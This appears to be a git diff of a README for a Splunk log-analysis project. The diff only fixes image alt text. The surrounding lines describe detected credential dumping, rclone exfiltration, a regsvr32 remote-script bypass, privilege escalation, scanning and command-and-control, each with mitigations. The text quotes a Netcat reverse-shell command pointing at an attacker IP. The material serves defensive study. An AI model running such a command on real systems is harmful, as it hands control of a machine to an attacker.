@@ -51,7 +51,7 @@ Mitigation recommendations:
 # Credential Dump
 We load a credential dump file from the T1003 folder "mimikatzwindows-sysmon.log"
 
-![(CredentialDump](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d429611e82a214a236bd279e5d156e32e6460f65/assets/credential.png)
+![CredentialDump](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d429611e82a214a236bd279e5d156e32e6460f65/assets/credential.png)
 
 This time we're loading a single log, but we have several things to observe.
 The execution of mimikatz.exe was detected on win-host-mhaag-attack-range-622 with elevated privileges. Mimikatz is a tool used to steal credentials on Windows.
@@ -75,7 +75,7 @@ Mitigation recommendations:
 # Data Exfiltration
 We load a Data Exfiltration file from the T1020 folder "windows-security.log"
 
-![(DataExfiltration](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/64c13a359befbc2930a65dc418eb10659cfe0837/assets/rclone.png)
+![DataExfiltration](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/64c13a359befbc2930a65dc418eb10659cfe0837/assets/rclone.png)
 
 - A program called "rclone.exe" is detected running with elevated privileges in "win-dc-137.attackrange.local". Rclone is a tool for transferring files to cloud services.
 - The process location is "C:\Users\Administrator\Downloads\rclone-v1.57.0-windows-amd64\rclone-v1.57.0-windows-amd64\rclone.exe"
@@ -92,7 +92,7 @@ Mitigation recommendations:
 
 # Malware Extraction
 
-![(MalwareExtraction](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d41bd6835f550b652f19fd4bf418c4c10a86ca24/assets/malware-ex.png)
+![MalwareExtraction](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/d41bd6835f550b652f19fd4bf418c4c10a86ca24/assets/malware-ex.png)
 
 Event 1: Using regsvr32.exe for remote execution
 The execution of regsvr32.exe was detected with the /i parameter pointing to a remote script (.sct), suggesting the use of Regsvr32 Bypass.
@@ -178,7 +178,7 @@ Mitigation:
 # Privilege Escalation
 This report documents the privilege escalation events detected in the environment. It details the techniques used, the analysis of each event, and recommendations for mitigating these attacks.
 
-![(PrivilegeEscalation](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/39e692863942d4c4b32ee49b547152edb651caa6/assets/privilege-escalation.png)
+![PrivilegeEscalation](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/39e692863942d4c4b32ee49b547152edb651caa6/assets/privilege-escalation.png)
 
 Event 1 (4673): Sensitive Privileges Requested by Winlogon (winlogon.exe)
 Winlogon requested sensitive privileges, which may indicate malicious activity or the exploitation of a system process.
@@ -239,7 +239,7 @@ Mitigations:
 # Network Scanning
 This report details the detection of 10 network scanning events in the monitoring environment. Network scanning is a technique used to map hosts, services, and ports open for both legitimate and malicious purposes. The detected events are analyzed, and mitigation strategies are proposed.
 
-![(NetworkScanning](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/2b7c379f302ea058ab4d23280fa10d0be01d7424/assets/network-scanning.png)
+![NetworkScanning](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/2b7c379f302ea058ab4d23280fa10d0be01d7424/assets/network-scanning.png)
 
 Event 1: This is an ARP Scan type that uses the "arp-scan -l" command. It scans the local network for active devices using ARP.
 - Source IP: 192.168.1.109
@@ -290,7 +290,7 @@ Mitigation:
 - Service Hardening: Disable unnecessary protocols and strengthen security settings on servers and network devices.
 
 # Command & Control
-![(Command&Control](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/fe195f85701c7c376d6abac465e0ec6ff75bee16/assets/c2-attacks.png)
+![Command&Control](https://github.com/FrancoGarciaC9701/Log-Analysis-with-Splunk/blob/fe195f85701c7c376d6abac465e0ec6ff75bee16/assets/c2-attacks.png)
 
 Event 1: The technique used is "Reverse Shell" by executing the command "nc -e /bin/bash 192.168.1.200 4444". This command uses Netcat to create a reverse shell, redirecting /bin/bash to the attacking host (192.168.1.200) on port 4444, allowing remote control of the compromised system.
 - Source IP: 192.168.1.100
